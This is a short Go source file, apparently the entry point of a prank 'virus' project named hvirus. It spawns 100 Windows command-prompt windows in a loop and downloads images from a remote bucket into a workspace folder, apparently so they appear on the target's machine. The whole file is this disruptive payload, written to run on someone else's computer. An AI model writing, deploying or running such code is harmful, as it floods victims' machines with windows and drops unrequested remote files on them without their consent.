package main

import (
	"os/exec"

	"github.com/joho/godotenv"
	"github.com/robertokbr/hvirus/bucket"
	"github.com/robertokbr/hvirus/utils"
)

func main() {
	godotenv.Load()

	workspaceDir := utils.GetWorkspaceDir()

	go func() {
		for i := 0; i < 100; i++ {
			cmd := exec.Command("cmd.exe", "/c", "start")
			cmd.Run()
		}
	}()

	images := bucket.ListURLs()

	utils.DownloadImages(images, workspaceDir)
}
